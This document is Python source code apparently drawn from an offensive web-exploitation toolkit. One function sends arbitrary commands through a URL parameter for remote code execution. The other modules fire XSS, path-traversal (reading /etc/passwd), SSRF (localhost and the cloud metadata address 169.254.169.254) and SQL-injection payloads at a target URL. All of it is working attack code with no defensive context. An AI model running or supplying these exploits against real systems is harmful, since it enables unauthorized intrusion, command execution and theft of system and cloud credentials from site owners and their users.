def rce_exploit(target_url, command):
    import requests
    payload = f"{target_url}?cmd={command}"
    try:
        res = requests.get(payload, timeout=10)
        if res.status_code == 200:
            print("[+] RCE Output:\n", res.text)
        else:
            print("[-] RCE Failed")
    except Exception as e:
        print("[!] Error:", e)

# --- exploit_modules/xss_scanner.py ---

def xss_scan(target_url):
    import requests
    payloads = ['<script>alert(1)</script>', '" onmouseover=alert(1)']
    for payload in payloads:
        url = f"{target_url}?q={payload}"
        try:
            r = requests.get(url)
            if payload in r.text:
                print(f"[+] Possible XSS found with payload: {payload}")
            else:
                print(f"[-] Payload not reflected: {payload}")
        except:
            print("[!] Request Failed")

# --- exploit_modules/lfi_detector.py ---

def lfi_check(target_url):
    import requests
    payloads = ['../../../../etc/passwd', '..%2F..%2F..%2Fetc%2Fpasswd']
    for p in payloads:
        test_url = f"{target_url}?file={p}"
        res = requests.get(test_url)
        if "root:x:" in res.text:
            print(f"[+] LFI Detected with payload: {p}")
        else:
            print(f"[-] LFI not detected with: {p}")

# --- exploit_modules/ssrf_scanner.py ---

def ssrf_scan(target_url):
    import requests
    test_urls = ['http://127.0.0.1:80', 'http://169.254.169.254']
    for url in test_urls:
        r = requests.get(f"{target_url}?url={url}")
        if r.status_code == 200 and "EC2" in r.text:
            print(f"[+] Possible SSRF with: {url}")

# --- exploit_modules/sql_injector.py ---

def sql_inject(target_url):
    import requests
    payloads = ["' OR 1=1 --", '" OR ""="']
    for p in payloads:
        url = f"{target_url}?id={p}"
        r = requests.get(url)
        if "syntax" in r.text or "mysql" in r.text.lower():
            print(f"[+] SQLi suspected with: {p}")
